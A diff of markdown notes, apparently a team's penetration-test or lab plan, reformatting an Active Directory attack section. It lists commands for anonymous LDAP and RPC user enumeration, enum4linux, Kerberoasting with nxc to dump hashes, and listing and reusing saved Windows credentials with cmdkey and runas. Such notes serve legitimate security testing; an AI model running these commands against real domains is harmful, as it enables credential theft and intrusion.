@@ -36,17 +36,17 @@ Now we have version numbers. Use SearchSploit and the CVE database to find CVEs 
 - [ ] Josiah - SMB and LDAP user enumeration
 - [ ] Lamoreaux - check Kerberos pre-auth and start Kerberos attacks
 ## Lamoreaux - AD Plan:
-1. `ldapsearch` and `rpcclient` to see if anonymous binding is allowed
+###### `ldapsearch` and `rpcclient` to see if anonymous binding is allowed
 ```
 ldapsearch -x -H ldap://<DC_IP> -s base
 rpcclient -U "" <DC_IP> 
 	enumdomusers # If above command is successful
 	enumdomgroups
 ```
-1. [[enum4linux]], [nxe](https://www.netexec.wiki/)
+######  [[enum4linux]], [nxe](https://www.netexec.wiki/)
 	1. `enum4linux -a <target-ip>` 
-2. Attempt to get a list of valid users, try pre-auth, try to kerberoast (`kerbrute`, `impacket`)
-	1. ==Kerberoasting== Requires a valid account: 
+###### Attempt to get a list of valid users, try pre-auth, try to kerberoast (`kerbrute`, `impacket`)
+- ==Kerberoasting== Requires a valid account: 
 ```nxc
 nxc ldap <DC> -u <user> -p <password> --kerberoasting kerb_hashes.txt # 
 nxc ldap <DC> -u <user> -p <password> --users # Get a list of valid users
@@ -117,6 +117,8 @@ GTFOBins is basically an index of Linux PrivEsc methods. How to use it:
 ## Windows
 List saved credentials:
 `cmdkey /list`
+
+##### [[PowerUp]]
 
 Use saved credentials:
 `runas /savecred /user:admin cmd.exe`
